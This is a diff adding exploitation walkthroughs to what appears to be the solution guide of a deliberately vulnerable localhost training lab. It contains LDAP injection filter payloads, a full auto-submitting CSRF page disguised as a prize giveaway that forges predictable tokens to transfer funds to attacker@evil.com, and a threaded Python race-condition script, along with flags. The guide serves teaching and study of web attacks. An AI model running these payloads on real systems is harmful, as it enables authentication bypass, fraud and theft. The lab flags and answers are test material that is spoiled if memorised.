@@ -1389,21 +1389,197 @@ curl -X POST "http://localhost:5000/api/vuln/host-header-injection/reset" \
 # Flag: {HOST_HEADER_X_ORIGINAL_HOST_BYPASS}
 ```
 
-### 7. Labs with Existing Bypass Methods
+### 7. LDAP Injection Bypass Methods
 
-The following labs already include intermediate-level bypass methods:
+#### Bypass Method 1: Wildcard Filter Bypass
+**Vulnerability:** LDAP filter doesn't sanitize wildcard characters  
+**Bypass:** Use `*` wildcard to match all entries
 
-**LDAP Injection:**
-- Wildcard bypass: `username=*` bypasses authentication
-- Flag: {LDAP_INJECTION_WILDCARD_BYPASS}
+**Exploitation:**
+```bash
+# Standard login attempt (fails without valid credentials)
+curl "http://localhost:5000/api/vuln/ldap-injection?username=admin&password=wrongpass"
 
-**Advanced CSRF:**
-- SameSite=None cookie bypass allows cross-site requests
-- Flag: {CSRF_SAMESITE_BYPASS}
+# Wildcard bypass to dump all directory entries
+curl "http://localhost:5000/api/vuln/ldap-injection?username=*"
+# Flag: {LDAP_INJECTION_WILDCARD_BYPASS}
+```
 
-**Race Condition:**
-- TOCTOU (Time-of-check-time-of-use) exploitation
-- Flag: {RACE_CONDITION_EXPLOITED_MULTIPLE_USES}
+**Using Burp Suite:**
+1. Intercept the LDAP search request
+2. Modify username parameter to: `*`
+3. Server returns all LDAP directory entries including admin accounts
+4. Extract sensitive information from directory listings
+
+#### Bypass Method 2: Comment Injection
+**Vulnerability:** LDAP comment syntax not filtered  
+**Bypass:** Use `#` or `//` to comment out password check
+
+**Exploitation:**
+```bash
+# Comment out the password portion of LDAP filter
+curl "http://localhost:5000/api/vuln/ldap-injection?username=admin)%23"
+# This transforms filter from: (username=admin)(password=xxx) 
+# To: (username=admin)# <- password check commented out
+```
+
+#### Bypass Method 3: Boolean-Based LDAP Injection
+**Vulnerability:** LDAP operators not sanitized  
+**Bypass:** Use OR operator to always match
+
+**Exploitation:**
+```bash
+# OR injection to bypass authentication
+curl "http://localhost:5000/api/vuln/ldap-injection?username=*)(uid=*"
+# Creates filter: (username=*)(uid=*) - always true
+```
+
+### 8. Advanced CSRF - SameSite=None Bypass
+
+#### Bypass Method: SameSite=None Cookie Exploitation
+**Vulnerability:** Cookies set with SameSite=None attribute  
+**Bypass:** Create cross-site request that includes vulnerable cookies
+
+**Exploitation Using Burp Suite:**
+
+**Step 1: Analyze the Session Cookie**
+1. Navigate to the Advanced CSRF lab
+2. In Burp's Proxy → HTTP History, find the Set-Cookie header
+3. Observe: `Set-Cookie: csrf_session=user_123; SameSite=None`
+4. This cookie WILL be sent in cross-origin requests!
+
+**Step 2: Analyze CSRF Token Weakness**
+1. Examine the CSRF token generation in lab interface
+2. Token format: `csrf_${timestamp}` (predictable!)
+3. Token uses current Unix timestamp - easily guessable
+
+**Step 3: Create Malicious Page**
+```html
+<!-- Save as evil.html and host on different origin -->
+<!DOCTYPE html>
+<html>
+<body>
+<h1>Win a Free iPhone!</h1>
+<form id="csrf" action="http://localhost:5000/api/vuln/csrf-advanced/transfer" method="POST">
+  <input type="hidden" name="recipient" value="attacker@evil.com">
+  <input type="hidden" name="amount" value="10000">
+  <input type="hidden" name="csrf_token" id="token">
+</form>
+<script>
+  // Predict CSRF token using timestamp
+  const timestamp = Math.floor(Date.now() / 1000);
+  document.getElementById('token').value = 'csrf_' + timestamp;
+  
+  // Auto-submit form
+  document.getElementById('csrf').submit();
+</script>
+</body>
+</html>
+```
+
+**Step 4: Host and Test**
+```bash
+# Host malicious page on different port/domain
+python3 -m http.server 8000
+
+# When victim (logged into bank) visits http://localhost:8000/evil.html
+# The SameSite=None cookie is sent with the CSRF attack!
+# Flag: {CSRF_SAMESITE_BYPASS_SUCCESSFUL}
+```
+
+**Alternative Exploitation - GET-based Attack:**
+```html
+<!-- Simple image-based CSRF (no JavaScript required) -->
+<img src="http://localhost:5000/api/vuln/csrf-advanced/change-email?email=attacker@evil.com">
+```
+
+**Why This Works:**
+1. Cookie has `SameSite=None` - browser sends it cross-site
+2. CSRF token is predictable (timestamp-based)
+3. No Referrer validation on server
+4. GET requests allowed for state-changing operations
+
+### 9. Race Condition - TOCTOU Bypass
+
+#### Bypass Method: Time-of-Check-Time-of-Use (TOCTOU) Exploitation
+**Vulnerability:** Discount code validation and usage not atomic  
+**Bypass:** Send multiple parallel requests before code is marked as used
+
+**Exploitation Using Burp Suite:**
+
+**Step 1: Understand the Vulnerability**
+1. Server checks if discount code is valid (Time of Check)
+2. **Delay exists here** - exploit window!
+3. Server marks code as used (Time of Use)
+4. In the delay window, send duplicate requests
+
+**Step 2: Manual Testing**
+```bash
+# Get initial balance (should be $100)
+curl "http://localhost:5000/api/vuln/race-condition"
+
+# Try using code once (adds $50, balance = $150)
+curl -X POST "http://localhost:5000/api/vuln/race-condition/apply-discount" \
+  -H "Content-Type: application/json" \
+  -d '{"discountCode":"SAVE50"}'
+```
+
+**Step 3: Race Condition Attack with Burp Suite**
+
+**Using Burp Repeater (Group Send):**
+1. Send discount request to Repeater
+2. Right-click → Create tab group (add 20 copies)
+3. Select all tabs → Send group in parallel
+4. Watch multiple requests succeed before code is marked used
+5. Balance increases beyond $150 (multiple $50 credits)
+6. Flag: {RACE_CONDITION_EXPLOITED_MULTIPLE_USES}
+
+**Using Burp Intruder:**
+1. Send request to Intruder
+2. Clear all payload positions (we're not fuzzing parameters)
+3. Set attack type to "Sniper"
+4. Payloads → Payload type: Null payloads
+5. Generate 50 payloads
+6. Resource Pool → Create new pool with 50 concurrent requests
+7. Start attack
+8. Multiple requests complete before validation locks the code
+
+**Step 4: Python Script for Automated Exploitation**
+```python
+import requests
+import threading
+
+url = "http://localhost:5000/api/vuln/race-condition/apply-discount"
+data = {"discountCode": "SAVE50"}
+
+def exploit():
+    response = requests.post(url, json=data)
+    print(f"Response: {response.status_code} - {response.json()}")
+
+# Launch 20 parallel requests
+threads = []
+for i in range(20):
+    t = threading.Thread(target=exploit)
+    threads.append(t)
+    t.start()
+
+# Wait for all to complete
+for t in threads:
+    t.join()
+
+print("Race condition attack complete!")
+```
+
+**Expected Result:**
+- Normal usage: 1 successful application (balance = $150)
+- Race condition: 5-10 successful applications (balance = $350-$600)
+- Flag received when balance > $150
+
+**Why This Works:**
+1. Check and use operations are not atomic
+2. No mutex/lock on discount code validation
+3. Database doesn't have proper transaction isolation
+4. Multiple requests exploit the time gap between validation and marking as used
 
 ---
 
